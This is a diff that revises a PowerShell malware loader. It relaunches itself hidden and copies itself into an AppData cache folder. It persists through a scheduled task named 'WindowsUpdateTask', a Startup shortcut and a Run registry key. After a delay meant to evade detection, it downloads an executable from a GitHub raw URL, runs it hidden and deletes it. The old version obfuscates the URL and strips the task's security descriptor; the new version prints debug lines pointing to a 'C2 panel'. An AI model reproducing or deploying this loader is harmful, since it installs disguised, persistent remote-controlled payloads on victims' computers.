@@ -1,13 +1,13 @@
 $ErrorActionPreference = 'SilentlyContinue'
 
-# === SELF-PRESERVATION ===
+# === SELF-PRESERVATION + HIDDEN RELAUNCH ===
 $localPath = "$env:APPDATA\Microsoft\Windows\Caches\launcher.ps1"
 $currentPath = $MyInvocation.MyCommand.Path
 
 if ($Host.Name -eq 'ConsoleHost') {
     $null = Start-Job -ScriptBlock {
         param($path)
-        Start-Process powershell.exe -ArgumentList "-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$path`"" -WindowStyle Hidden
+        Start-Process powershell.exe -ArgumentList "-ExecutionPolicy Bypass -WindowStyle Hidden -NoProfile -NonInteractive -File `"$path`"" -WindowStyle Hidden
     } -ArgumentList $MyInvocation.MyCommand.Path
     exit
 }
@@ -15,16 +15,13 @@ if ($Host.Name -eq 'ConsoleHost') {
 function Save-ScriptToDisk {
     param([string]$Destination)
     $dir = Split-Path $Destination -Parent
-    if (-not (Test-Path $dir)) { 
-        New-Item -ItemType Directory -Path $dir -Force | Out-Null
-    }
+    if (-not (Test-Path $dir)) { New-Item -ItemType Directory -Path $dir -Force | Out-Null }
+    
     if (-not $currentPath -or $currentPath -eq '') {
         try {
             $rawUrl = "https://raw.githubusercontent.com/astro-opensource/cloud-sync-tools/refs/heads/main/assets/launcher.ps1"
             (New-Object System.Net.WebClient).DownloadString($rawUrl) | Out-File -FilePath $Destination -Encoding UTF8 -Force
-        } catch {
-            exit
-        }
+        } catch { exit }
     } else {
         Copy-Item -Path $currentPath -Destination $Destination -Force
     }
@@ -33,40 +30,16 @@ function Save-ScriptToDisk {
 
 $scriptPath = Save-ScriptToDisk -Destination $localPath
 
-# === PERSISTENCE: Scheduled Task (Direct PowerShell) ===
+# === PERSISTENCE ===
 $taskName = "WindowsUpdateTask"
 if (-not (Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue)) {
     $trigger = New-ScheduledTaskTrigger -AtLogOn -User $env:USERNAME
-    $encoded = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes(
-        "-ExecutionPolicy Bypass -WindowStyle Hidden -NoProfile -NonInteractive -File `"$scriptPath`""
-    ))
-    
-    $action = New-ScheduledTaskAction -Execute "powershell.exe" `
-        -Argument "-EncodedCommand $encoded"
-    
-    $settings = New-ScheduledTaskSettingsSet `
-        -AllowStartIfOnBatteries $true `
-        -DontStopIfGoingOnBatteries $true `
-        -StartWhenAvailable $true `
-        -Hidden $true `
-        -ExecutionTimeLimit (New-TimeSpan -Hours 2) `
-        -Priority 7  # Lower priority helps hide it more
-    
-    Register-ScheduledTask -TaskName $taskName `
-        -Action $action `
-        -Trigger $trigger `
-        -Settings $settings `
-        -User $env:USERNAME `
-        -Force | Out-Null
-    
-    # Nuke security descriptor for stealth
-    $taskPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\$taskName"
-    if (Test-Path $taskPath) {
-        Remove-ItemProperty -Path $taskPath -Name "SecurityDescriptor" -Force -ErrorAction SilentlyContinue
-    }
+    $encoded = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes("-ExecutionPolicy Bypass -WindowStyle Hidden -NoProfile -NonInteractive -File `"$scriptPath`""))
+    $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-EncodedCommand $encoded"
+    $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries $true -DontStopIfGoingOnBatteries $true -StartWhenAvailable $true -Hidden $true -ExecutionTimeLimit (New-TimeSpan -Hours 2) -Priority 7
+    Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Settings $settings -User $env:USERNAME -Force | Out-Null
 }
 
-# === PERSISTENCE: Startup LNK (Direct PowerShell) ===
 $lnkPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\WindowsUpdateHelper.lnk"
 if (-not (Test-Path $lnkPath)) {
     $wsh = New-Object -ComObject WScript.Shell
@@ -74,63 +47,54 @@ if (-not (Test-Path $lnkPath)) {
     $shortcut.TargetPath = "powershell.exe"
     $shortcut.Arguments = "-ExecutionPolicy Bypass -WindowStyle Hidden -NoProfile -NonInteractive -File `"$scriptPath`""
     $shortcut.WorkingDirectory = "$env:APPDATA\Microsoft\Windows\Caches"
-    $shortcut.WindowStyle = 7  # Hidden
-    $shortcut.IconLocation = "C:\Windows\System32\shell32.dll,0"  # Looks legit
+    $shortcut.WindowStyle = 7
+    $shortcut.IconLocation = "C:\Windows\System32\shell32.dll,0"
     $shortcut.Save()
 }
 
-# === REGISTRY RUN KEY (backup persistence) ===
 $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
 $regName = "WindowsUpdateHelper"
 if (-not (Get-ItemProperty -Path $regPath -Name $regName -ErrorAction SilentlyContinue)) {
     Set-ItemProperty -Path $regPath -Name $regName -Value "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -NoProfile -NonInteractive -File `"$scriptPath`""
 }
 
-# === BEARFOOS EVASION: Delay before EXE ===
+# === DELAY ===
 Start-Sleep -Seconds (Get-Random -Min 45 -Max 90)
 
-# === DOWNLOAD AND EXECUTE PAYLOAD ===
+# === DOWNLOAD + EXECUTE (FIXED URL) ===
 $cache = "$env:APPDATA\Microsoft\Windows\Caches"
 if (-not (Test-Path $cache)) { New-Item -ItemType Directory -Path $cache -Force | Out-Null }
 
-$exeUrl = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2FzdHJvLW9wZW5zb3VyY2UvY2xvdWQtc3luYy10b29scy9tYWluL2Fzc2V0cy9XaW5kb3dzVXBkYXRlSGVscGVyLmV4ZQ=='))
+$exeUrl = "https://raw.githubusercontent.com/astro-opensource/cloud-sync-tools/main/assets/WindowsUpdateHelper.exe"
 $exePath = "$cache\WindowsUpdateHelper.exe"
 
-$headers = @{'User-Agent' = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36'}
+Write-Host "[DEBUG] Attempting download: $exeUrl" -ForegroundColor Yellow
 
 if (-not (Test-Path $exePath)) {
     $retryCount = 0
-    $maxRetries = 3
+    $maxRetries = 6
     do {
         try {
-            Invoke-WebRequest -Uri $exeUrl -OutFile $exePath -Headers $headers -UseBasicParsing
+            Invoke-WebRequest -Uri $exeUrl -OutFile $exePath -UseBasicParsing -TimeoutSec 30 -MaximumRetryCount 3
+            Write-Host "[+] EXE DOWNLOADED SUCCESSFULLY ($( (Get-Item $exePath).Length ) bytes)" -ForegroundColor Green
             break
         } catch {
             $retryCount++
-            Start-Sleep -Seconds 5
+            Write-Host "[-] Attempt $retryCount failed: $($_.Exception.Message)" -ForegroundColor Red
+            Start-Sleep -Seconds 6
         }
     } while ($retryCount -lt $maxRetries)
 }
 
+# === EXECUTION ===
 if (Test-Path $exePath) {
-    try {
-        $wmiParams = @{
-            ComputerName = $env:COMPUTERNAME
-            CommandLine  = "`"$exePath`""
-        }
-        Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList $wmiParams.CommandLine -ErrorAction Stop | Out-Null
-    } catch {
-        try {
-            $wsh = New-Object -ComObject WScript.Shell
-            $wsh.Run("`"$exePath`"", 0, $false)
-        } catch {
-            Start-Process $exePath -WindowStyle Hidden
-        }
-    }
+    Write-Host "[+] Executing WindowsUpdateHelper.exe ..." -ForegroundColor Cyan
+    try { Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "`"$exePath`"" | Out-Null } catch {}
+    try { (New-Object -ComObject WScript.Shell).Run("`"$exePath`"", 0, $false) } catch {}
+    try { Start-Process $exePath -WindowStyle Hidden } catch {}
+    
+    Start-Job -ScriptBlock { param($p) Start-Sleep 300; Remove-Item $p -Force } -ArgumentList $exePath | Out-Null
+    Write-Host "[+] Payload should be running. Check your C2 panel." -ForegroundColor Green
+} else {
+    Write-Host "[-] FAILED TO DOWNLOAD EXE. Try manual download from the GitHub link." -ForegroundColor Red
 }
-
-Start-Job -ScriptBlock {
-    param($exe)
-    Start-Sleep -Seconds 300
-    Remove-Item -Path $exe -Force -ErrorAction SilentlyContinue
-} -ArgumentList $exePath | Out-Null
